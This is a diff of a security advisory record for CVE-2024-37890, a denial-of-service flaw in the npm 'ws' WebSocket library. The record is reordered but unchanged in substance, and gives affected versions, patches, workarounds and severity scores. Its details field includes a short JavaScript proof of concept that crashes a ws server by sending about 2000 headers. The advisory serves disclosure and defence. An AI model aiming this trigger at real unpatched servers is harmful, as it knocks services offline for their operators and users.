@@ -1,31 +1,114 @@
 {
-  "id": "GHSA-3h5v-q93c-6h6q",
-  "summary": "ws affected by a DoS when handling a request with many HTTP headers",
-  "details": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws",
+        "purl": "pkg:npm/ws"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "2.1.0"
+            },
+            {
+              "fixed": "5.2.4"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws",
+        "purl": "pkg:npm/ws"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "6.0.0"
+            },
+            {
+              "fixed": "6.2.3"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws",
+        "purl": "pkg:npm/ws"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "7.0.0"
+            },
+            {
+              "fixed": "7.5.10"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "ws",
+        "purl": "pkg:npm/ws"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "8.0.0"
+            },
+            {
+              "fixed": "8.17.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2024-37890"
   ],
-  "modified": "2024-07-15T22:12:28.401556Z",
-  "published": "2024-06-17T19:09:10Z",
-  "related": [
-    "CGA-4mjj-vhp5-59v2",
-    "CGA-6rmc-53qg-r2v4",
-    "CGA-cm39-xg6p-r3wr",
-    "CGA-h8rj-78mh-45v7",
-    "CGA-hf88-h9xp-mq5f",
-    "CGA-qv4g-5p29-rxvx",
-    "CGA-r6qh-9mxv-rrj2",
-    "CVE-2024-37890"
-  ],
   "database_specific": {
-    "nvd_published_at": null,
     "cwe_ids": [
       "CWE-476"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2024-06-17T19:09:10Z"
+    "github_reviewed_at": "2024-06-17T19:09:10Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
   },
+  "details": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+  "id": "GHSA-3h5v-q93c-6h6q",
+  "modified": "2024-07-15T22:12:28.401556Z",
+  "published": "2024-06-17T19:09:10Z",
   "references": [
     {
       "type": "WEB",
@@ -60,109 +143,26 @@
       "url": "https://github.com/websockets/ws"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "ws",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/ws"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "2.1.0"
-            },
-            {
-              "fixed": "5.2.4"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
-      }
-    },
-    {
-      "package": {
-        "name": "ws",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/ws"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "6.0.0"
-            },
-            {
-              "fixed": "6.2.3"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
-      }
-    },
-    {
-      "package": {
-        "name": "ws",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/ws"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "7.0.0"
-            },
-            {
-              "fixed": "7.5.10"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
-      }
-    },
-    {
-      "package": {
-        "name": "ws",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/ws"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "8.0.0"
-            },
-            {
-              "fixed": "8.17.1"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-3h5v-q93c-6h6q/GHSA-3h5v-q93c-6h6q.json"
-      }
-    }
+  "related": [
+    "CGA-4mjj-vhp5-59v2",
+    "CGA-6rmc-53qg-r2v4",
+    "CGA-cm39-xg6p-r3wr",
+    "CGA-h8rj-78mh-45v7",
+    "CGA-hf88-h9xp-mq5f",
+    "CGA-qv4g-5p29-rxvx",
+    "CGA-r6qh-9mxv-rrj2",
+    "CVE-2024-37890"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     },
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "ws affected by a DoS when handling a request with many HTTP headers"
 }
